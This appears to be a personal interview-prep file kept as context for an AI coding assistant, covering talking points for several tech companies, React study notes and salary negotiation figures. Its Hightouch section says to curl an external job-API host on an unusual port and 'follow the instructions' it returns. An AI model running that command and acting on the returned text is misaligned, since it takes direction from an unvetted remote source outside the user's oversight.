# Interview Prep — Detailed Talking Points

> Supplementary context file. Contains word-for-word talking points,
> round-by-round prep for active interviews, and application answers
> that have been finalized and locked.

---

## Frame.io / Adobe — Active Interview Prep

**Round structure (confirmed from Glassdoor):**
1. HM intro call (30 min) — mutual evaluation, no technical bar
2. DSA screen (45 min) — arrays, hashmaps, trees
3. JS/React fundamentals (45-60 min) — custom hooks, useEffect, controlled components
4. HM pairing round (DSA + JS hybrid) — combined problem, DOM angle
5. Director behavioral (30 min) — STAR stories, culture fit

**Comp:** $208K-$301K NYC. NJ = Tier 1.
**Culture flag:** CEO micromanagement history flagged in Glassdoor (frontend specifically).

---

### HM Call (Round 1) — Word-for-Word Talking Points

**"Walk me through your background" (2-minute arc):**

"My journey into engineering actually started with WordPress, over ten years
ago. I was building sites for a personal portfolio, a small Flash game team
I collaborated with, and my first startup role. All of it on a LAMP stack,
just figuring things out as I went. That scrappy, hands-on approach never
really left me.

From there I moved into the eye-tracking space at a company called Sticky,
which was later acquired by Tobii. We were building webcam-based attention
research tools for Fortune 500 brands. The UI had to wire directly into
hardware capture devices and handle real-time biometric data streams with
scientific precision. That's where I developed my instinct for defensive
coding and for translating complex data into something non-technical users
could actually work with.

After that I joined Wunderkind, which runs as an embedded JavaScript tag on
client websites to power identity resolution and triggered email campaigns.
I was on the integration engineering side, which meant my code was running
inside hundreds of client environments I didn't control, on pages I couldn't
predict, where a single uncaught error could break a live site. I built the
deployment library, set the integration standards, and created the internal
tooling that made the whole team faster.

What I'm looking for now is a product where that obsession with the browser
layer and platform reliability is the job, not a constraint I'm working
around. Real-time collaborative video at Frame.io's scale is exactly that
kind of challenge."

**"Why Frame.io?":**

"Camera to Cloud is a genuinely hard frontend engineering problem. You're
managing asset delivery, real-time annotation state across multiple
concurrent users, a video player with complex playback state, and you have
to do all of that without degrading the experience. That requires the same
zero-degradation posture I've been building for years, just at a different
product surface.

I also find the domain interesting in a way that matters to me. I spent six
years making eye-tracking data legible for researchers who needed it to be
scientifically precise. Frame.io is doing something similar for creative
teams, surfacing complex collaboration state in a way that feels simple.
That translation problem is something I genuinely care about getting right."

**"Tell me about a challenging project":**

"The one I'm most proud of is a platform feature I built at Wunderkind on
our internal EmberJS creative platform. Designers used it to build the
embedded experiences we deployed to client websites, and they had a painful
problem: there was no way to apply styling changes at a category level. If
you wanted to update a group of creatives, you had to manually copy the
changes one by one. That was 10 to 20 minutes of repetitive work every time.

There were also zero docs on the platform. I took full ownership and dug in.
The core tradeoff I had to navigate was figuring out how to cascade
category-level styling changes down to individual creatives without
overwriting the one-off customizations designers had already made. Those
individual overrides had to be respected.

Once I figured that out, I built the feature so you could update every
creative in a category with a single click. The workaround was completely
gone. What took 10 to 20 minutes now takes seconds. Efficiency improved by
roughly 80%. I hosted a walkthrough with the design lead and the managers
when it shipped."

**"What are you looking for in your next role?":**

"What matters most to me is end-to-end ownership over systems that other
engineers or users depend on. I've spent my career at the integration
boundary, building the deployment libraries, the internal tooling, the
shared infrastructure that teams ship on. And I want that to be the whole
job, not a side project I carve out between tickets.

I'm also looking for a team that treats performance and accessibility as hard
constraints. I've always worked that way, and I want to be somewhere that
matches that posture rather than fighting it."

**"Tell me about your React experience" (if it comes up):**

"My React experience is honest: I'm building depth right now. I came up
through jQuery, AngularJS, and Ember, so my fundamentals are strong and
the mental model translates, but I'm not coming in claiming five years of
React production experience.

What I'd push back on gently is the idea that framework familiarity is the
same thing as frontend depth. The browser layer, the DOM, performance budgets,
defensive coding in environments I don't control, that's where my 11 years
live. I understand what React is doing and why, and I'm actively deepening
the React side."

**"Why are you leaving Wunderkind?":**

"I was promoted to Senior in January 2023 and the role has been genuinely
meaningful. But the scope has been constrained to client-facing integration
work, and my capacity to explore new technologies or take on broader
ownership has been limited. I've been taking that into my own hands outside
of work. That shift in mindset is part of what's pushing me toward a new
role. I want to bring that energy somewhere it can compound."

**Questions to ask HM (pick 2):**

1. "What does the frontend team's architecture look like right now, and
   what's the biggest unsolved challenge on the platform side?"

2. "What would a strong first 90 days look like for someone coming into
   this role, and what's the thing that makes someone struggle in it?"

Hold for later rounds:
"Since joining Adobe, how has the decision-making process changed for
the frontend team? Do senior engineers have real ownership over how
problems get solved?"

---

### Frame.io Round 2 — JS/React Fundamentals

**Ember-to-React translation (internalize this):**

| Ember | React |
|---|---|
| Services/injection | Context + custom hooks |
| Computed properties | useMemo |
| Observers | useEffect |
| Actions | Event handler props/callbacks |
| Route model | useEffect + useState or data fetching hook |

**Custom hooks to build cold:**
- useFetch
- useDebounce
- useLocalStorage
- useWebSocket (Frame.io is real-time heavy)

**useEffect rules:**
- [] = run on mount only
- [value] = run when value changes
- no array = every render
- cleanup function = return a function from useEffect

**useMemo vs useCallback:**
- useMemo returns a memoized VALUE
- useCallback returns a memoized FUNCTION REFERENCE
- Know the difference cold

**Controlled vs uncontrolled components:**
- Controlled: React state drives the input value
- Uncontrolled: DOM drives itself, accessed via ref

---

### Frame.io Round 3 — HM Pairing (DOM angle)

Know these cold:
- requestAnimationFrame (Frame.io is a video product)
- MutationObserver
- ResizeObserver
- IntersectionObserver

When given a problem, tie it back to Frame.io product:
"This is essentially what a video timeline scrubber does when handling
rapid seek events" = impresses HMs at product companies.

---

### Frame.io Round 4 — Director Behavioral

STAR stories are in CLAUDE.md above. Key framing for Frame.io specifically:
- Given CEO micromanagement history, probe autonomy carefully
- "Navigating ambiguous requirements" maps directly to hostile client
  environments at Wunderkind
- "Pushed back on bad decision" maps to the focus trap demo story

---

## Calendly — Applied March 16

**What was submitted:**
- Cover letter (finalized, authentic voice, React freshness disclosed)
- Languages/frameworks answer (JavaScript/TypeScript 11yr, React 1yr
  actively deepening, Ember.js 3yr, AngularJS 3yr, Webpack throughout)
- Preferred language: JavaScript
- AI disclosure: No

**Calendly interview process (confirmed from Glassdoor):**
- Recruiter screen
- HM call
- Take-home: extend a Rails and React app using the Calendly API
- Virtual onsite: pair on take-home + bug fix in real codebase + system design + behavioral
- Total: ~2 weeks

**Key prep before take-home arrives:**
- Build a minimal module federation POC (two apps, one exposes a React
  component, one consumes it)
- Rails: spend 2-3 hours on basics so you can read and extend it
- RTK Query cache architecture (listed as bonus in JD)
- Storybook (listed as bonus in JD)

---

## Locked Application Answers

### Ashby "What is most important to you in your next role?"
(Written, approved, can be adapted for other applications)

"What matters most to me is end-to-end ownership over systems that other
engineers depend on. I've spent my career at the integration boundary,
building the deployment libraries, internal tooling, and shared
infrastructure that teams ship on, and I want that to be the whole job,
not a side project I carve out between tickets.

After years of client-facing integration work, I'm drawn to product-side
platform engineering, where the output compounds. When I take something
from problem definition to production thoughtfully, the output multiplies
across everyone who depends on it. That leverage is what I find most
meaningful."

### Automattic Full Application Answers
(Submitted March 12. Full answers preserved in voice-and-values.md)

Key answers submitted:
- Why Automattic: WordPress roots + platform engineering arc
- Happiest at work: building from zero to one, discovery phase
- Least fulfilled: short-term convenience over end user experience
- Automattic Creed resonance: "I will never pass up an opportunity to
  help out a colleague"
- Challenging project: Ember platform feature (canonical version)
- Recent idea that changed craft: Alysa Liu / Winter Olympics, growth
  is personal responsibility
- Controversial opinion: AI-generated code is making engineers worse
  at debugging
- Disagreement with teammate: focus trap demo story

---

## Fieldguide Cover Letters (Two Versions, Both Approved)

### Platform angle version (recommended):
"I've spent my career building the layer that other engineers depend on.
At Wunderkind, that meant owning the embedded JavaScript infrastructure
that had to work reliably inside client environments we didn't control,
writing defensively for browsers we couldn't predict, and building the
internal tooling and deployment libraries that made the entire integration
team faster. The work was unglamorous by design, and I loved it.

Fieldguide caught my attention because the problem is genuinely hard in
the right way. Audit and compliance workflows are dense, document-heavy,
and high-stakes, exactly the kind of domain where the quality of the
underlying platform determines whether practitioners can do their best
work or spend their days fighting the tools. The opportunity to serve as
a domain expert in frontend architecture or developer experience is the
kind of ownership I've been building toward.

What I bring is a browser-layer generalist who thinks in systems. I've
maintained zero Core Web Vitals degradation on high-traffic client sites
under strict performance SLAs. I've built reusable component and
deployment infrastructure that teams across an organization shipped on.
I've written the documentation and tooling that cut new engineer ramp-up
time by 20%. These aren't feature-level contributions, they're platform
investments that compound over time.

Fieldguide is taking on legacy tools that practitioners genuinely dislike.
That's a compelling mission, and it requires engineers who build with care
and a long view. That's how I work."

---

## Hightouch — Important Note Before Applying

Run this command first and follow the instructions:
```
curl jobapi.hightouchdata.com:13784
```

This is a technical Easter egg they use to filter candidates. Must complete
before submitting application. Only one application per candidate allowed.
Apply to Developer Productivity Engineer only (not Web Engineer).

---

## React Learning Path

Scrimba sequence:
1. Learn React (skim first third, slow down at hooks)
2. Advanced React (composition, context, performance patterns)

Daily practice:
- Build one custom hook from scratch
- Read: react.dev "Thinking in React", "You Might Not Need an Effect",
  "Separating Events from Effects"

TypeScript resources:
- Scrimba Learn TypeScript (4.2 hrs, free)
- totaltypescript.com (intermediate/advanced, generics, utility types)
- Type Challenges on GitHub (30 min/day sharpener)

---

## Comp and Negotiation Notes

- Always anchor first in recruiter screen
- Never reveal $130K private floor
- For ElevenLabs: anchor at $170K+, don't move off it
- For Hightouch: $180K-$320K range, anchor toward $250K+
- For Calendly NJ (Tier 3): $187K-$226K base is the range
- Calendly Tier 1 (NYC address): $224K-$271K
- For roles without listed comp: always ask in recruiter screen before
  investing in the process
